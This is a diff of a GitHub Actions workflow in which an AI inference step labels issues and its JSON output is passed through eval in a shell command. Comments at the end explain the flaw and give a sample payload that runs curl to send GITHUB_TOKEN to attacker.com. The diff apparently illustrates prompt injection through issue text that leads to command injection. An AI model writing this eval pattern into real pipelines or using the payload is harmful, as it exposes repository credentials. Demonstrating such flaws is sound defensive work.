@@ -60,7 +60,19 @@ steps:
     uses: actions/ai-inference@v1
     with:
       prompt: |
-// ... (13 lines trimmed)
+        Read the issue and return JSON with labels to apply.
+        Use the form {"labels":["bug","docs"]}.
+  - name: Apply labels
+    env:
+      ISSUE_NUMBER: ${{ github.event.issue.number }}
+      AI_RESPONSE: ${{ steps.ai-inference.outputs.response }}
+    run: |
+      LABELS=$(python - <<'PY'
+      import json, os
+      data = json.loads(os.environ["AI_RESPONSE"])
+      print(" ".join(f'--add-label "{label}"' for label in data["labels"]))
+      PY
+      )
       eval gh issue edit "$ISSUE_NUMBER" $LABELS
       # eval expands shell metacharacters in AI-generated label values
       # attacker crafts: {"labels": ["$(curl attacker.com/exfil?t=$GITHUB_TOKEN)"]}
